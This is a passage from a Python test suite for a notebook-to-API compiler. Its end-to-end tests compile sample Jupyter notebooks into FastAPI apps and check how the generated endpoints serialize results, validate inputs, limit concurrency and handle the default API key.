assert post("/later", {{"item": {{"n": 1}}}}).json() == {{"result": 4}}
assert post("/nested", {{"items": [{{}}, {{"n": 2}}]}}).json() == {{"result": 2}}

# Types Pydantic *can* model keep validating exactly as before.
assert post("/mode", {{"m": "b"}}).json() == {{"result": "b"}}
assert post("/mode", {{"m": "Later"}}).status_code == 422
assert post("/bounded", {{"n": 0}}).status_code == 422
print("ANNOTATION_ROBUSTNESS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ANNOTATION_ROBUSTNESS_E2E_OK" in proc.stdout


def test_forward_reference_conversion_applies_to_annotations_not_default_expressions():
    from backend.generator.api_generator import _resolve_annotation_source

    # In a default value, a string argument is just a string.
    assert _resolve_annotation_source("float('inf')", forward_refs=False)[0] == "float('inf')"
    assert _resolve_annotation_source("os.environ.get('HOME', 'x')", forward_refs=False)[0] == (
        "notebook_module.os.environ.get('HOME', 'x')"
    )


def _notebook_with_error_cells():
    import nbformat

    notebook = nbformat.v4.new_notebook()
    ok = nbformat.v4.new_code_cell("def add(a: int, b: int) -> int:\n    return a + b\n")
    ok.outputs = [nbformat.v4.new_output("stream", name="stdout", text="fine\n")]
    markdown = nbformat.v4.new_markdown_cell("not code")
    broken = nbformat.v4.new_code_cell("x = 1\nscratch_value\n")
    broken.outputs = [nbformat.v4.new_output(
        "error", ename="NameError", evalue="name 'scratch_value' is not defined",
        traceback=["\x1b[0;31m---> 2\x1b[0m scratch_value\n", "NameError: ..."],
    )]
    no_line = nbformat.v4.new_code_cell("1 / 0")
    no_line.outputs = [nbformat.v4.new_output(
        "error", ename="ZeroDivisionError", evalue="division by zero", traceback=[],
    )]
    notebook.cells = [ok, markdown, broken, no_line]
    return notebook


def test_find_cells_with_error_outputs_reports_cells_that_failed_when_last_run():
    from backend.compiler import _find_cells_with_error_outputs

    found = _find_cells_with_error_outputs(_notebook_with_error_cells())

    # Numbered among *code* cells only (the markdown cell doesn't count).
    assert found == [
        {"cell": 2, "line": 2, "error": "NameError", "message": "name 'scratch_value' is not defined"},
        {"cell": 3, "line": None, "error": "ZeroDivisionError", "message": "division by zero"},
    ]


def test_find_cells_with_error_outputs_is_empty_for_a_clean_notebook():
    import nbformat

    from backend.compiler import _find_cells_with_error_outputs

    clean = nbformat.v4.new_notebook()
    clean.cells = [nbformat.v4.new_code_cell("x = 1\n"), nbformat.v4.new_markdown_cell("hi")]
    assert _find_cells_with_error_outputs(clean) == []


def test_compiled_app_flags_and_can_refuse_the_default_api_key(tmp_path):
    """Confirmed before this: an app deployed with NOTEBOOK_API_KEY unset
    silently accepted the built-in default key -- published in this project's
    own source -- with no warning and no way to tell from the outside."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": "def add(a: int, b: int) -> int:\n    return a + b\n",
            }],
        }),
        encoding="utf-8",
    )

    compile_script = (
        f"import sys; sys.path.insert(0, {str(PROJECT_ROOT)!r}); "
        "from backend.compiler import compile_notebook; "
        f"compile_notebook({str(notebook_path)!r}, 'generated')"
    )
    compiled = subprocess.run(
        [sys.executable, "-c", compile_script], cwd=str(workdir), capture_output=True, text=True, timeout=60,
    )
    assert compiled.returncode == 0, compiled.stdout + compiled.stderr

    def run_app(extra_env):
        env = {k: v for k, v in os.environ.items() if not k.startswith("NOTEBOOK_API_")}
        env.update(extra_env)
        env["PYTHONPATH"] = f"{PROJECT_ROOT}{os.pathsep}{workdir}"
        probe = (
            "from fastapi.testclient import TestClient\n"
            "from generated.app import app\n"
            "print('STATUS', TestClient(app).get('/auth/status').json()['using_default_api_key'])\n"
        )
        return subprocess.run(
            [sys.executable, "-W", "ignore", "-c", probe],
            cwd=str(workdir), capture_output=True, text=True, timeout=60, env=env,
        )

    # No key configured: starts, warns, and says so from /auth/status.
    default = run_app({})
    assert default.returncode == 0, default.stdout + default.stderr
    assert "STATUS True" in default.stdout
    assert "built-in default API key" in default.stderr

    # A real key: no warning, flag false.
    custom = run_app({"NOTEBOOK_API_KEY": "s3cret"})
    assert "STATUS False" in custom.stdout
    assert "built-in default API key" not in custom.stderr

    # The default key still listed alongside a real one (rotation) is flagged.
    rotating = run_app({"NOTEBOOK_API_KEY": "s3cret,notebook-to-api-dev-key"})
    assert "STATUS True" in rotating.stdout

    # REQUIRE_CUSTOM_KEY: a hard stop without a real key ...
    refused = run_app({"NOTEBOOK_API_REQUIRE_CUSTOM_KEY": "true"})
    assert refused.returncode != 0
    assert "NOTEBOOK_API_REQUIRE_CUSTOM_KEY is set" in refused.stderr
    # ... and fine with one.
    allowed = run_app({"NOTEBOOK_API_REQUIRE_CUSTOM_KEY": "true", "NOTEBOOK_API_KEY": "s3cret"})
    assert allowed.returncode == 0, allowed.stderr
    assert "STATUS False" in allowed.stdout


def test_compiled_app_can_reject_undeclared_request_fields(tmp_path):
    """Confirmed before this: a request with a misspelled parameter
    ({"treshold": 9}) was accepted, the extra silently dropped, and the
    function run with that parameter's default -- a plausible-looking wrong
    answer. NOTEBOOK_API_STRICT_FIELDS=true now answers 422 instead."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def scale(threshold: float = 0.5, n: int = 1) -> float:\n    return threshold * n\n\n"
                    "def nothing() -> int:\n    return 1\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    compile_script = (
        f"import sys; sys.path.insert(0, {str(PROJECT_ROOT)!r}); "
        "from backend.compiler import compile_notebook; "
        f"compile_notebook({str(notebook_path)!r}, 'generated')"
    )
    compiled = subprocess.run(
        [sys.executable, "-c", compile_script], cwd=str(workdir), capture_output=True, text=True, timeout=60,
    )
    assert compiled.returncode == 0, compiled.stdout + compiled.stderr

    def run_app(extra_env):
        env = {k: v for k, v in os.environ.items() if not k.startswith("NOTEBOOK_API_")}
        env.update(extra_env)
        env["PYTHONPATH"] = f"{PROJECT_ROOT}{os.pathsep}{workdir}"
        probe = (
            "import json\n"
            "from fastapi.testclient import TestClient\n"
            "from generated.app import app\n"
            "c = TestClient(app); H = {'X-API-Key': 'notebook-to-api-dev-key'}\n"
            "typo = c.post('/scale', json={'treshold': 9}, headers=H)\n"
            "good = c.post('/scale', json={'threshold': 2, 'n': 3}, headers=H)\n"
            "empty = c.post('/nothing', json={'x': 1}, headers=H)\n"
            "print(json.dumps([typo.status_code, typo.json(), good.json(), empty.status_code]))\n"
        )
        result = subprocess.run(
            [sys.executable, "-W", "ignore", "-c", probe],
            cwd=str(workdir), capture_output=True, text=True, timeout=60, env=env,
        )
        assert result.returncode == 0, result.stdout + result.stderr
        return json.loads(result.stdout.strip().splitlines()[-1])

    # Default: unchanged behavior -- the extra is dropped, the default used.
    typo_status, typo_body, good_body, empty_status = run_app({})
    assert (typo_status, typo_body, good_body, empty_status) == (200, {"result": 0.5}, {"result": 6.0}, 200)

    # Strict: undeclared fields are a 422 -- including on a no-parameter endpoint.
    typo_status, typo_body, good_body, empty_status = run_app({"NOTEBOOK_API_STRICT_FIELDS": "true"})
    assert typo_status == 422
    assert typo_body["detail"][0]["type"] == "extra_forbidden"
    assert typo_body["detail"][0]["loc"] == ["body", "treshold"]
    assert good_body == {"result": 6.0}
    assert empty_status == 422


def test_compiled_app_can_limit_concurrent_notebook_calls(tmp_path):
    """Notebook code is rarely written for concurrency, yet every sync call
    ran in a thread pool with no cap. NOTEBOOK_API_MAX_CONCURRENT_CALLS=1
    serializes every call (and background task); unset keeps the old,
    unlimited behavior."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import threading, time\n"
                    "_lock = threading.Lock()\n"
                    "_running = 0\n"
                    "PEAK = 0\n\n"
                    "def _work(seconds):\n"
                    "    global _running, PEAK\n"
                    "    with _lock:\n"
                    "        _running += 1\n"
                    "        PEAK = max(PEAK, _running)\n"
                    "    time.sleep(seconds)\n"
                    "    with _lock:\n"
                    "        _running -= 1\n\n"
                    "def slow(n: int) -> int:\n    _work(0.3)\n    return n\n\n"
                    "# notebook-to-api: background\n"
                    "def train(n: int) -> int:\n    _work(0.3)\n    return n\n\n"
                    "def peak() -> int:\n    return PEAK\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    compile_script = (
        f"import sys; sys.path.insert(0, {str(PROJECT_ROOT)!r}); "
        "from backend.compiler import compile_notebook; "
        f"compile_notebook({str(notebook_path)!r}, 'generated')"
    )
    compiled = subprocess.run(
        [sys.executable, "-c", compile_script], cwd=str(workdir), capture_output=True, text=True, timeout=60,
    )
    assert compiled.returncode == 0, compiled.stdout + compiled.stderr

    def peak_concurrency(extra_env):
        env = {k: v for k, v in os.environ.items() if not k.startswith("NOTEBOOK_API_")}
        env.update(extra_env)
        env["PYTHONPATH"] = f"{PROJECT_ROOT}{os.pathsep}{workdir}"
        probe = (
            "import time\n"
            "from concurrent.futures import ThreadPoolExecutor\n"
            "from fastapi.testclient import TestClient\n"
            "from generated.app import app\n"
            "H = {'X-API-Key': 'notebook-to-api-dev-key'}\n"
            "with TestClient(app) as c:\n"
            "    with ThreadPoolExecutor(4) as pool:\n"
            "        results = list(pool.map(lambda n: c.post('/slow', json={'n': n}, headers=H).status_code, range(4)))\n"
            "    assert results == [200] * 4, results\n"
            "    ids = [c.post('/train', json={'n': n}, headers=H).json()['task_id'] for n in range(3)]\n"
            "    deadline = time.time() + 20\n"
            "    while any(c.get('/tasks/' + i, headers=H).json()['status'] == 'processing' for i in ids):\n"
            "        assert time.time() < deadline, 'tasks never finished'\n"
            "        time.sleep(0.05)\n"
            "    print('PEAK', c.post('/peak', json={}, headers=H).json()['result'])\n"
        )
        result = subprocess.run(
            [sys.executable, "-W", "ignore", "-c", probe],
            cwd=str(workdir), capture_output=True, text=True, timeout=90, env=env,
        )
        assert result.returncode == 0, result.stdout + result.stderr
        return int(result.stdout.split("PEAK")[-1].split()[0])

    assert peak_concurrency({}) > 1
    assert peak_concurrency({"NOTEBOOK_API_MAX_CONCURRENT_CALLS": "1"}) == 1
    assert peak_concurrency({"NOTEBOOK_API_MAX_CONCURRENT_CALLS": "2"}) == 2


def test_startup_warning_lines_describe_each_kind_of_startup_problem():
    from backend.inspector import startup_warning_lines

    data = {
        "unrecognized_directives": [{"directive": "cahce", "line": "# notebook-to-api: cahce 5"}],
        "cells_with_errors": [{"cell": 2, "line": 1, "error": "NameError", "message": "name 'x' is not defined"}],
        "import_time_hazards": [
            {"kind": "file_read", "call": "pd.read_csv", "path": "sales.csv", "cell": 1, "line": 2},
            {"kind": "input", "call": "input", "path": None, "cell": 3, "line": 4},
        ],
    }

    assert startup_warning_lines(data) == [
        "Ignored directive: # notebook-to-api: cahce 5",
        "Cell 2 raised NameError when last run (name 'x' is not defined) -- it runs again when the app starts",
        "Cell 1, line 2: pd.read_csv('sales.csv') reads a data file the compiled app won't ship -- the app will fail on startup",
        "Cell 3, line 4: input() waits on stdin, which the compiled app doesn't have -- the app will fail on startup",
    ]
    assert startup_warning_lines({}) == []


def test_with_jupyter_prelude_keeps_future_imports_first():
    from backend.compiler import _with_jupyter_prelude

    # No stubs needed -> the code is returned unchanged.
    plain = "from __future__ import annotations\nx = 1\n"
    assert _with_jupyter_prelude(plain) == plain

    # Nothing before the code: stubs go on top.
    top = _with_jupyter_prelude("display(1)\n")
    assert top.startswith("# Jupyter built-ins") and top.endswith("display(1)\n")

    # After a docstring and several future imports, but before everything else.
    code = '"""Doc."""\nfrom __future__ import annotations\nfrom __future__ import division\ndisplay(1)\nx = 1\n'
    result = _with_jupyter_prelude(code)
    lines = result.split("\n")
    assert lines[:3] == ['"""Doc."""', "from __future__ import annotations", "from __future__ import division"]
    assert result.index("def display(") < result.index("display(1)\nx = 1")
    compile(result, "<runtime>", "exec")  # a future import after other code would be a SyntaxError

    # Unparseable code is left alone.
    assert _with_jupyter_prelude("def broken(:\n") == "def broken(:\n"


def test_compiler_pipeline_future_import_notebooks_can_use_display_and_get_ipython(tmp_path):
    """Confirmed before this: the stubs were skipped for any notebook using
    `from __future__`, so a top-level display(...) still crashed the app."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [
                {
                    "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                    "source": (
                        '"""Analysis notebook."""\n'
                        "from __future__ import annotations\n"
                        "FACTOR = 3\n"
                        "display(FACTOR)\n"
                        "NOT_IN_JUPYTER = get_ipython() is None\n"
                    ),
                },
                {
                    "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                    "source": (
                        "def scale(x: int) -> int:\n    return x * FACTOR\n\n"
                        "def outside() -> bool:\n    return NOT_IN_JUPYTER\n"
                    ),
                },
            ],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

assert client.post("/scale", json={{"x": 2}}, headers=headers).json() == {{"result": 6}}
assert client.post("/outside", json={{}}, headers=headers).json() == {{"result": True}}
print("FUTURE_IMPORT_STUBS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "FUTURE_IMPORT_STUBS_E2E_OK" in proc.stdout


def test_compiler_pipeline_bytes_buffers_and_non_string_dict_keys_are_plain_json(tmp_path):
    """Confirmed before this: returning binary bytes (an image, a PDF) was a
    500 "utf-8 codec can't decode", an io.BytesIO came back as a silent `{}`,
    and a dict keyed by tuples crashed the encoder."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import io\n"
                    "def png(n: int):\n    return b'\\x89PNG\\r\\n\\x1a\\n' + b'\\x00' * 4\n\n"
                    "def pdf(n: int):\n    return b'%PDF-1.4\\xff'\n\n"
                    "def text(n: int):\n    return b'hello'\n\n"
                    "def raw(n: int):\n    return bytearray(b'\\xff\\xfe')\n\n"
                    "def buffer(n: int):\n    b = io.BytesIO()\n    b.write(b'\\xff\\xfe\\x00')\n    return b\n\n"
                    "def text_buffer(n: int):\n    s = io.StringIO()\n    s.write('abc')\n    return s\n\n"
                    "def pair_keys(n: int):\n    return {(1, 2): 'a', 3: 'b', None: 'c', 'k': 'd'}\n\n"
                    "def nested(n: int):\n    return {'blob': b'\\xff\\x00', 'ok': 1}\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import base64
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 1}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

def decode(uri, mime):
    prefix = "data:" + mime + ";base64,"
    assert uri.startswith(prefix), uri
    return base64.b64decode(uri[len(prefix):])

assert decode(call("png"), "image/png") == b"\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\x00"
assert decode(call("pdf"), "application/pdf") == b"%PDF-1.4\\xff"
assert call("text") == "hello"  # valid UTF-8 stays text, as before
assert decode(call("raw"), "application/octet-stream") == b"\\xff\\xfe"
assert decode(call("buffer"), "application/octet-stream") == b"\\xff\\xfe\\x00"
assert call("text_buffer") == "abc"
assert call("pair_keys") == {{"(1, 2)": "a", "3": "b", "null": "c", "k": "d"}}
nested = call("nested")
assert decode(nested["blob"], "application/octet-stream") == b"\\xff\\x00" and nested["ok"] == 1
print("BYTES_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "BYTES_JSON_E2E_OK" in proc.stdout


def test_compiler_pipeline_generators_and_lazy_iterators_are_plain_json(tmp_path):
    """Confirmed before this: returning map/filter/zip/dict views/itertools
    objects was a 500 "not iterable"/"vars() argument", and a generator
    (a function using `yield`) skipped _json_safe, so NaN, bytes or a nested
    generator inside it crashed serialization."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import itertools\n"
                    "def gen(n: int):\n    for i in range(n):\n        yield float('nan') if i == 1 else i\n\n"
                    "def mapped(n: int):\n    return map(lambda x: x * 2, range(n))\n\n"
                    "def filtered(n: int):\n    return filter(None, [0, 1, 2])\n\n"
                    "def zipped(n: int):\n    return zip(['a', 'b'], [1, 2])\n\n"
                    "def values(n: int):\n    return {'a': 1, 'b': float('inf')}.values()\n\n"
                    "def keys(n: int):\n    return {'a': 1, 'b': 2}.keys()\n\n"
                    "def chained(n: int):\n    return itertools.chain([1], (x for x in [b'\\xff']))\n\n"
                    "def nested(n: int):\n    return {'rows': (i for i in range(n)), 'pairs': enumerate('ab')}\n\n"
                    "def empty(n: int):\n    return iter([])\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 3}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("gen") == [0, None, 2]
assert call("mapped") == [0, 2, 4]
assert call("filtered") == [1, 2]
assert call("zipped") == [["a", 1], ["b", 2]]
assert call("values") == [1, None]
assert call("keys") == ["a", "b"]
assert call("chained") == [1, "data:application/octet-stream;base64,/w=="]
assert call("nested") == {{"rows": [0, 1, 2], "pairs": [[0, "a"], [1, "b"]]}}
assert call("empty") == []
print("ITERATOR_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ITERATOR_JSON_E2E_OK" in proc.stdout


def test_compiler_pipeline_complex_numbers_and_fractions_are_plain_json(tmp_path):
    """Confirmed before this: returning a complex number (an FFT bin, a
    polynomial root) or a fractions.Fraction was a 500 "not
    JSON-serializable", and a numpy complex array crashed the same way."""
    pytest.importorskip("numpy")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "from fractions import Fraction\n"
                    "import numpy as np\n"
                    "def poly_root(n: int):\n    return complex(1, -2)\n\n"
                    "def bad(n: int):\n    return complex(float('nan'), 1)\n\n"
                    "def ratio(n: int):\n    return Fraction(1, 4)\n\n"
                    "def spectrum(n: int):\n    return np.fft.fft([1.0, 0.0])\n\n"
                    "def scalar(n: int):\n    return np.complex128(3 + 4j)\n\n"
                    "def nested(n: int):\n    return {'z': [1j], 'f': Fraction(3, 2)}\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 1}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

assert call("poly_root") == {{"real": 1.0, "imag": -2.0}}
assert call("bad") == {{"real": None, "imag": 1.0}}
assert call("ratio") == 0.25
assert call("spectrum") == [{{"real": 1.0, "imag": 0.0}}, {{"real": 1.0, "imag": 0.0}}]
assert call("scalar") == {{"real": 3.0, "imag": 4.0}}
assert call("nested") == {{"z": [{{"real": 0.0, "imag": 1.0}}], "f": 1.5}}
print("COMPLEX_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "COMPLEX_JSON_E2E_OK" in proc.stdout


def test_compiler_pipeline_dataclass_and_plain_object_fields_are_normalized(tmp_path):
    """Confirmed before this: a dataclass or plain object whose fields held
    bytes, a complex number or a generator was a 500, because those fields
    reached the encoder without the normalization a bare value gets."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import dataclasses, enum\n"
                    "from pydantic import BaseModel\n"
                    "@dataclasses.dataclass\nclass Result:\n    z: complex\n    blob: bytes\n    rows: object\n\n"
                    "class Plain:\n    def __init__(self):\n        self.score = float('nan')\n        self.raw = b'\\xff'\n        self.inner = Result(2j, b'ok', [])\n\n"
                    "class Color(enum.Enum):\n    RED = 'red'\n\n"
                    "class Model(BaseModel):\n    x: int\n\n"
                    "def dc(n: int):\n    return Result(1j, b'\\xff', (i for i in range(n)))\n\n"
                    "def plain(n: int):\n    return Plain()\n\n"
                    "def mixed(n: int):\n    return {'c': Color.RED, 'm': Model(x=n), 'items': [Result(0j, b'a', None)]}\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def call(name):
    response = client.post("/" + name, json={{"n": 2}}, headers=headers)
    assert response.status_code == 200, (name, response.status_code, response.text)
    return response.json()["result"]

blob = "data:application/octet-stream;base64,/w=="
assert call("dc") == {{"z": {{"real": 0.0, "imag": 1.0}}, "blob": blob, "rows": [0, 1]}}
assert call("plain") == {{
    "score": None, "raw": blob,
    "inner": {{"z": {{"real": 0.0, "imag": 2.0}}, "blob": "ok", "rows": []}},
}}
# Enum members and pydantic models keep the encoder's own handling.
assert call("mixed") == {{
    "c": "red", "m": {{"x": 2}},
    "items": [{{"z": {{"real": 0.0, "imag": 0.0}}, "blob": "a", "rows": None}}],
}}
print("OBJECT_FIELDS_JSON_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "OBJECT_FIELDS_JSON_E2E_OK" in proc.stdout


def test_compiler_pipeline_var_args_functions_get_a_list_field_spread_into_the_call(tmp_path):
    """Confirmed before this: a notebook function taking *args got no
    endpoint at all (POST returned 404). Its extra positional values now
    arrive as a JSON list, validated against the *args annotation."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def total(*values):\n    return sum(values)\n\n"
                    "def mixed(a: int, *rest: int, scale: int = 1, **opts):\n"
                    "    return {'a': a, 'rest': [r * scale for r in rest], 'opts': opts}\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name, body):
    return client.post("/" + name, json=body, headers=headers)

assert post("total", {{"values": [1, 2, 3]}}).json()["result"] == 6
assert post("total", {{}}).json()["result"] == 0  # *args may be omitted
r = post("mixed", {{"a": 1, "rest": [2, 3], "scale": 10, "opts": {{"k": "v"}}}})
assert r.json()["result"] == {{"a": 1, "rest": [20, 30], "opts": {{"k": "v"}}}}, r.text
assert post("mixed", {{"a": 1, "rest": ["x"]}}).status_code == 422
assert post("total", {{"values": 5}}).status_code == 422
schema = app.openapi()["components"]["schemas"]
assert any(s.get("properties", {{}}).get("rest", {{}}).get("type") == "array" for s in schema.values())
print("VAR_ARGS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "VAR_ARGS_E2E_OK" in proc.stdout


def test_compiler_pipeline_async_generator_functions_return_their_items_as_a_list(tmp_path):
    """Confirmed before this: an `async def` notebook function that yields
    was a 500 "object async_generator can't be used in 'await' expression",
    on both a regular endpoint and a background task."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import asyncio\n"
                    "async def stream(n: int):\n"
                    "    for i in range(n):\n        await asyncio.sleep(0)\n"
                    "        yield float('nan') if i == 1 else i\n\n"
                    "async def broken(n: int):\n    yield 1\n    raise ValueError('bad row')\n\n"
                    "async def plain(n: int):\n    return n * 2\n\n"
                    "async def train_stream(n: int):\n    for i in range(n):\n        yield i * 10\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

def post(name):
    return client.post("/" + name, json={{"n": 3}}, headers=headers)

r = post("stream")
assert r.status_code == 200 and r.json()["result"] == [0, None, 2], r.text
r = post("broken")
assert r.status_code == 500 and "bad row" in r.text, r.text
assert post("plain").json()["result"] == 6  # plain coroutines unchanged

task_id = post("train_stream").json()["task_id"]
for _ in range(50):
    task = client.get("/tasks/" + task_id, headers=headers).json()
    if task["status"] != "processing":
        break
    time.sleep(0.05)
assert task["status"] == "completed" and task["result"] == [0, 10, 20], task
print("ASYNC_GEN_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ASYNC_GEN_E2E_OK" in proc.stdout


def test_compiler_pipeline_lists_and_dicts_of_arrays_and_frames_are_rebuilt(tmp_path):
    """Confirmed before this: List[np.ndarray], `*arrays: np.ndarray` and
    Dict[str, pd.DataFrame] parameters reached the function as plain JSON
    lists/dicts, so `arr.sum()` / `df.columns` was a 500 AttributeError."""
    pytest.importorskip("numpy")
    pytest.importorskip("pandas")
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "import numpy as np\nimport pandas as pd\nfrom typing import Dict, List, Optional\n"
                    "def shapes(xs: List[np.ndarray]):\n    return [list(x.shape) for x in xs]\n\n"
                    "def sums(*arrays: np.ndarray):\n    return [float(a.sum()) for a in arrays]\n\n"
                    "def widths(frames: Dict[str, pd.DataFrame]):\n    return {k: len(f.columns) for k, f in frames.items()}\n\n"
